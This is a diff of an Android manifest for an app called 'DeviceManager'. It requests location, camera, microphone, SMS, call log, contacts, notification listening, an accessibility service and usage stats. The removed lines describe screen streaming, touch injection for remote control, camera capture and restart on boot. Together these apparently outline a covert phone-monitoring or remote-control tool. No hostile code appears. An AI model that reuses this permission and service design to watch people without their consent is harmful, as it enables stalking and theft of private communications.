@@ -10,48 +10,35 @@
     <!-- Location -->
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
-    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
 
-    <!-- Camera -->
+    <!-- Camera & Audio -->
     <uses-permission android:name="android.permission.CAMERA" />
-
-    <!-- Microphone (for screen recording audio) -->
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
 
-    <!-- Contacts -->
+    <!-- Communication & Contacts -->
     <uses-permission android:name="android.permission.READ_CONTACTS" />
-
-    <!-- Call Log -->
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
-
-    <!-- SMS -->
     <uses-permission android:name="android.permission.READ_SMS" />
-    <uses-permission android:name="android.permission.RECEIVE_SMS" />
 
-    <!-- Storage (for older Android versions; scoped storage used on 10+) -->
+    <!-- Media / Storage -->
     <uses-permission
         android:name="android.permission.READ_EXTERNAL_STORAGE"
         android:maxSdkVersion="32" />
 
     <!-- Foreground Services -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
 
     <!-- Notifications -->
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
 
-    <!-- Wake Lock -->
+    <!-- Wake Lock & State -->
     <uses-permission android:name="android.permission.WAKE_LOCK" />
-
-    <!-- Boot Completed -->
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
 
-    <!-- Query all packages (for usage stats app name resolution) -->
+    <!-- Query packages & stats -->
     <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
         tools:ignore="QueryAllPackagesPermission" />
-
-    <!-- Package Usage Stats (special permission, granted via Settings) -->
     <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"
         tools:ignore="ProtectedPermissions" />
 
@@ -73,38 +60,27 @@
         android:networkSecurityConfig="@xml/network_security_config"
         tools:targetApi="34">
 
-        <!-- Setup Activity (launcher) -->
+        <!-- Main Launcher Activity -->
         <activity
-            android:name=".ui.SetupActivity"
+            android:name=".MainActivity"
             android:exported="true"
-            android:theme="@style/Theme.DeviceManager">
+            android:theme="@style/Theme.DeviceManager"
+            android:windowSoftInputMode="adjustResize">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
 
-        <!-- Main Activity -->
-        <activity
-            android:name=".ui.MainActivity"
-            android:exported="false"
-            android:theme="@style/Theme.DeviceManager" />
-
-        <!-- Permissions Activity -->
-        <activity
-            android:name=".ui.PermissionsActivity"
-            android:exported="false"
-            android:theme="@style/Theme.DeviceManager" />
-
-        <!-- Main Foreground Service: keeps app alive, manages WebSocket -->
+        <!-- Device Management Background Service -->
         <service
-            android:name=".services.MainForegroundService"
+            android:name=".service.DeviceManagementService"
             android:exported="false"
             android:foregroundServiceType="dataSync" />
 
         <!-- Notification Listener Service -->
         <service
-            android:name=".services.NotificationListener"
+            android:name=".service.NotificationMonitorService"
             android:exported="true"
             android:label="@string/notification_listener_label"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
@@ -113,23 +89,11 @@
             </intent-filter>
         </service>
 
-        <!-- Screen Record Service (MediaProjection) -->
+        <!-- Device Accessibility Service -->
         <service
-            android:name=".services.ScreenRecordService"
-            android:exported="false"
-            android:foregroundServiceType="mediaProjection" />
-
-        <!-- Screen Stream Service (MediaProjection for remote control) -->
-        <service
-            android:name=".services.ScreenStreamService"
-            android:exported="false"
-            android:foregroundServiceType="mediaProjection" />
-
-        <!-- Remote Input Service (AccessibilityService for touch injection) -->
-        <service
-            android:name=".services.RemoteInputService"
+            android:name=".service.DeviceAccessibilityService"
             android:exported="true"
-            android:label="@string/remote_input_label"
+            android:label="@string/accessibility_service_label"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
@@ -139,22 +103,7 @@
                 android:resource="@xml/accessibility_service_config" />
         </service>
 
-        <!-- Camera Capture Service -->
-        <service
-            android:name=".services.CameraCaptureService"
-            android:exported="false"
-            android:foregroundServiceType="camera" />
-
-        <!-- Boot Receiver to restart foreground service -->
-        <receiver
-            android:name=".services.BootReceiver"
-            android:exported="true">
-            <intent-filter>
-                <action android:name="android.intent.action.BOOT_COMPLETED" />
-            </intent-filter>
-        </receiver>
-
-        <!-- FileProvider for captured media -->
+        <!-- FileProvider -->
         <provider
             android:name="androidx.core.content.FileProvider"
             android:authorities="${applicationId}.fileprovider"
